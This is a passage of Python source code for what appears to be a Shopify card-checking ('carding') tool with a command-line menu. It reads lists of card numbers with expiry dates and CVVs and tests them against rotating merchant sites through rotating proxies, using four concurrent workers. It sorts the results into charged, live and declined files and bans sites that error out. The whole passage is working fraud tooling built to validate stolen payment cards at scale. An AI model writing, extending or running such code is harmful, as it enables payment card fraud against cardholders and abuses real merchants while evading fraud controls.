                   "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED" in result or
                   "TAX_NEW_TAX_MUST_BE_ACCEPTED" in result or
                   "PAYMENTS_METHOD" in result)
        
        # Check if response is a LEGITIMATE Shopify response (including challenges)
        is_legitimate = ("DECLINED" in result or "CHARGED" in result or 
                        "ORDER PLACED" in result or "APPROVED" in result or
                        "LIVE" in result or "WAITING_PENDING_TERMS" in result)
        
        if is_dead_site:
            # Site is DEAD - ban it permanently
            print(f"   ❌ Site error detected - BANNING site")
            error_msg = result[:30] if result else "Unknown error"
            async with dead_sites_lock:
                GLOBAL_STATE.ban_site_permanently(current_site, f"Error: {error_msg}")
            await asyncio.sleep(0.5)
            continue
        elif is_legitimate:
            # Valid response from site - mark as used and save result
            site_usage[current_site] = site_usage.get(current_site, 0) + 1
            card_result = result
            is_valid = True
            print(f"   ✅ Valid response (Site use: {site_usage[current_site]}/3)")
            break
        else:
            # Unknown response - try next site but don't ban it
            print(f"   ⚠️ Unknown response - trying next site")
            await asyncio.sleep(0.5)
            continue
    
    if not card_result:
        card_result = "ERROR: All 5 site attempts failed"
    elif not is_valid:
        card_result = f"ERROR: Site error after {max_site_retries} attempts"
    
    result_entry = f"{card}: {card_result}"
    
    # Categorize results - CHECK DECLINED FIRST to avoid false positives
    if "CHARGED" in card_result or "ORDER PLACED" in card_result:
        category = "charged"
        status = "💳 CHARGED"
    elif "DECLINED" in card_result or "REJECTED" in card_result or "Payment Rejected" in card_result:
        category = "declined"
        status = "❌ DECLINED"
    elif "CAPTCHA" in card_result.upper() or "3D SECURE" in card_result or "action required" in card_result.lower() or "verification" in card_result.lower():
        category = "challenge"
        status = "🔐 CHALLENGE"
    elif "RISKY" in card_result or "fraud" in card_result.lower() or "suspicious" in card_result.lower():
        category = "suspicious"
        status = "⚠️ SUSPICIOUS"
    elif "LIVE" in card_result or "APPROVED" in card_result:
        category = "live"
        status = "💚 LIVE"
    else:
        category = "errors"
        status = "❓ UNKNOWN"
    
    # Save to file INSTANTLY (synchronous write + flush)
    try:
        if category not in file_handles:
            print(f"❌ CRITICAL: File handle missing for category '{category}'")
        elif file_handles[category] is None:
            print(f"❌ CRITICAL: File handle is None for category '{category}'")
        else:
            data_to_write = result_entry + '\n'
            file_handles[category].write(data_to_write)  # Synchronous write
            file_handles[category].flush()  # Synchronous flush to disk
            print(f"   ✅ SAVED: {result_entry[:50]}...")
    except Exception as e:
        print(f"❌ CRITICAL ERROR writing to {category}.txt: {str(e)}")
        import traceback
        traceback.print_exc()
    
    # Update stats
    async with stats_lock:
        stats[category] += 1
        stats['total'] += 1
        print(f"   {status}")
        print(f"   📊 Total: {stats['total']} | 💳 Charged: {stats['charged']} | 💚 Live: {stats['live']} | ❌ Declined: {stats['declined']} | 🔐 Challenge: {stats['challenge']} | ⚠️ Suspicious: {stats['suspicious']}")
    
    return result_entry

async def cli_mass_check():
    """CLI for mass card check with smart site rotation - 4 concurrent workers"""
    print("\n" + "="*50)
    print("🛍️  Shopify Mass Card Checker (4 Concurrent Workers)")
    print("="*50)

    use_rotation = input("\nUse site rotation (y/n)? (default: y): ").strip().lower()
    use_rotation = use_rotation != 'n'
    
    site = None  # Initialize to None
    if use_rotation:
        if len(GLOBAL_STATE.available_sites) == 0:
            print("❌ No sites available in rotation!")
            return
        print(f"🌐 Using site rotation ({len(GLOBAL_STATE.available_sites)} sites available)")
    else:
        site = input("Enter Shopify site URL: ").strip()
        if not site:
            print("❌ Site URL required!")
            return

    file_path = input("Enter path to cards file (one per line): ").strip()
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return

    try:
        async with aiofiles.open(file_path, 'r') as f:
            cards = [line.strip() for line in await f.readlines()]
            cards = [c for c in cards if c and re.match(r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', c)]
    except Exception as e:
        print(f"❌ Error reading file: {e}")
        return

    if not cards:
        print("❌ No valid cards found in file!")
        return

    print(f"\n📊 Starting mass check of {len(cards)} cards with 4 workers...")
    print("="*50)

    # Create output files (synchronous - guaranteed to work)
    file_handles = {}
    output_files = {
        'charged': 'charged.txt',
        'live': 'live.txt',
        'declined': 'declined.txt',
        'challenge': 'challenge.txt',
        'suspicious': 'suspicious.txt',
        'errors': 'errors.txt'
    }
    
    try:
        # Use synchronous file writing (more reliable than async)
        for category, filename in output_files.items():
            file_handles[category] = open(filename, 'a', encoding='utf-8', errors='replace')
        print("✅ Output files opened successfully (append mode, synchronous, UTF-8)")
    except Exception as e:
        print(f"❌ CRITICAL: Error opening files: {e}")
        return

    # Stats tracking
    stats = {
        'charged': 0,
        'live': 0,
        'declined': 0,
        'challenge': 0,
        'suspicious': 0,
        'errors': 0,
        'total': 0
    }
    stats_lock = asyncio.Lock()

    # Create worker tasks with semaphore (4 concurrent)
    semaphore = asyncio.Semaphore(4)
    dead_sites_lock = asyncio.Lock()
    
    # Shared site usage tracking for all workers in this batch
    batch_site_usage = {}
    
    async def worker_with_semaphore(card_index, card):
        async with semaphore:
            return await process_card_worker(card_index, card, use_rotation, site if not use_rotation else None, file_handles, stats_lock, stats, dead_sites_lock, batch_site_usage)
    
    # Run all cards concurrently with 4 workers max
    tasks = [worker_with_semaphore(i, card) for i, card in enumerate(cards, 1)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    # Close file handles & verify all data was saved
    try:
        for handle in file_handles.values():
            handle.close()  # Synchronous close
        print("✅ All file handles closed successfully")
    except Exception as e:
        print(f"❌ Error closing files: {e}")

    print("\n" + "="*50)
    print("📊 MASS CHECK COMPLETE")
    print("="*50)
    print(f"💳 Charged: {stats['charged']}")
    print(f"💚 Live: {stats['live']}")
    print(f"❌ Declined: {stats['declined']}")
    print(f"🔐 Challenge Required: {stats['challenge']}")
    print(f"⚠️ Suspicious/Risky: {stats['suspicious']}")
    print(f"❓ Errors: {stats['errors']}")
    print("="*50)
    
    # Verify files were created with data
    print(f"\n✅ FINAL RESULTS - FILES SAVED:")
    file_stats = {}
    for file_name, count in [('charged.txt', stats['charged']), ('live.txt', stats['live']), 
                              ('declined.txt', stats['declined']), ('challenge.txt', stats['challenge']),
                              ('suspicious.txt', stats['suspicious']), ('errors.txt', stats['errors'])]:
        try:
            if os.path.exists(file_name):
                file_size = os.path.getsize(file_name)
                with open(file_name, 'r') as f:
                    lines = f.readlines()
                print(f"   📄 {file_name}: {len(lines)} entries ({file_size} bytes)")
                if len(lines) > 0:
                    print(f"      First: {lines[0][:60]}...")
            else:
                print(f"   ⚠️  {file_name}: NOT CREATED")
        except Exception as e:
            print(f"   ❌ {file_name}: ERROR - {e}")

async def cli_mass_site_check():
    """CLI for mass site check"""
    print("\n" + "="*50)
    print("🛍️  Shopify Mass Site Checker")
    print("="*50)

    file_path = input("\nEnter path to sites file (one per line): ").strip()
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return

    try:
        async with aiofiles.open(file_path, 'r') as f:
            sites = [line.strip() for line in await f.readlines()]
            sites = [s for s in sites if s]
    except Exception as e:
        print(f"❌ Error reading file: {e}")
        return

    if not sites:
        print("❌ No sites found in file!")
        return

    print(f"\n📊 Checking {len(sites)} sites...")

    working, non_working = await mass_check_sites(sites)

    print("\n" + "="*50)
    print("✅ WORKING SITES")
    print("="*50)
    for site in working:
        print(site)
        print("-" * 30)

    print("\n" + "="*50)
    print("❌ NON-WORKING SITES")
    print("="*50)
    for site in non_working:
        print(site)
        print("-" * 30)

    # Save to files
    async with aiofiles.open('working_sites.txt', 'w', encoding='utf-8', errors='replace') as f:
        await f.write('\n\n'.join(working))

    async with aiofiles.open('non_working_sites.txt', 'w', encoding='utf-8', errors='replace') as f:
        await f.write('\n\n'.join(non_working))

    print(f"\n💾 Results saved to working_sites.txt and non_working_sites.txt")

async def cli_add_sites():
    """CLI to add sites to rotation"""
    print("\n" + "="*50)
    print("🛍️  Add Sites to Rotation")
    print("="*50)
    print("1. Load from file")
    print("2. Paste text directly")
    print("="*50)

    mode = input("\nSelect mode (1-2): ").strip()
    sites = []

    if mode == '1':
        file_path = input("Enter path to sites file (one per line): ").strip()
        if not os.path.exists(file_path):
            print(f"❌ File not found: {file_path}")
            return

        try:
            async with aiofiles.open(file_path, 'r') as f:
                sites = [line.strip() for line in await f.readlines()]
                sites = [s for s in sites if s]
        except Exception as e:
            print(f"❌ Error reading file: {e}")
            return

    elif mode == '2':
        print("\nPaste your sites (one per line). When done, press Enter twice:")
        text_input = []
        while True:
            line = input().strip()
            if not line:
                if text_input and text_input[-1] == "":
                    text_input.pop()
                    break
                text_input.append("")
            else:
                text_input.append(line)
        sites = [s for s in text_input if s]

    else:
        print("❌ Invalid selection!")
        return

    if not sites:
        print("❌ No sites found!")
        return

    GLOBAL_STATE.add_sites(sites)

    print(f"\n✅ Added {len(sites)} sites to rotation")
    print(f"📊 Total sites now: {len(GLOBAL_STATE.available_sites)}")

async def cli_add_proxies():
    """CLI to add proxies to rotation"""
    print("\n" + "="*50)
    print("🛍️  Add Proxies to Rotation")
    print("="*50)
    print("1. Load from file")
    print("2. Paste text directly")
    print("="*50)

    mode = input("\nSelect mode (1-2): ").strip()
    proxies = []

    if mode == '1':
        file_path = input("Enter path to proxies file (one per line): ").strip()
        if not os.path.exists(file_path):
            print(f"❌ File not found: {file_path}")
            return

        try:
            async with aiofiles.open(file_path, 'r') as f:
                proxies = [line.strip() for line in await f.readlines()]
                proxies = [p for p in proxies if p]
        except Exception as e:
            print(f"❌ Error reading file: {e}")
            return

    elif mode == '2':
        print("\nPaste your proxies (one per line). When done, press Enter twice:")
        text_input = []
        while True:
            line = input().strip()
            if not line:
                if text_input and text_input[-1] == "":
                    text_input.pop()
                    break
                text_input.append("")
            else:
                text_input.append(line)
        proxies = [p for p in text_input if p]

    else:
        print("❌ Invalid selection!")
        return

    if not proxies:
        print("❌ No proxies found!")
        return

    GLOBAL_STATE.add_proxies(proxies)

    print(f"\n✅ Added {len(proxies)} proxies to rotation")
    print(f"📊 Total proxies now: {len(GLOBAL_STATE.proxies)}")

async def cli_show_stats():
    """CLI to show statistics"""
    print(format_stats_response())

async def main_menu():
    """Main CLI menu"""
    while True:
        print("\n" + "="*50)
        print("🛍️  Shopify Auto Checkout - MAIN MENU")
        print("="*50)
        print("1. Single Card Check (/sx)")
        print("2. Mass Card Check (/msx)")
        print("3. Mass Site Check - Admin (/mssx)")
        print("4. Add Sites to Rotation - Admin (/addsx)")
        print("5. Add Proxies to Rotation - Admin (/addpp)")
        print("6. Show Statistics")
        print("7. Exit")
        print("="*50)

        choice = input("\nSelect option (1-7): ").strip()

        if choice == '1':
            await cli_single_check()
        elif choice == '2':
            await cli_mass_check()
        elif choice == '3':
            await cli_mass_site_check()
        elif choice == '4':
            await cli_add_sites()
        elif choice == '5':
            await cli_add_proxies()
        elif choice == '6':
            await cli_show_stats()
        elif choice == '7':
            print("👋 Goodbye!")
            break
        else:
            print("❌ Invalid choice!")

if __name__ == "__main__":
    print("\n" + "="*50)
    print("🛍️  Shopify Auto Checkout System")
    print("="*50)
    print("✅ Loaded global state")
    print(f"📊 Available sites: {len(GLOBAL_STATE.available_sites)}")
    print(f"🔌 Available proxies: {len(GLOBAL_STATE.proxies)}")
    print("="*50)

    asyncio.run(main_menu())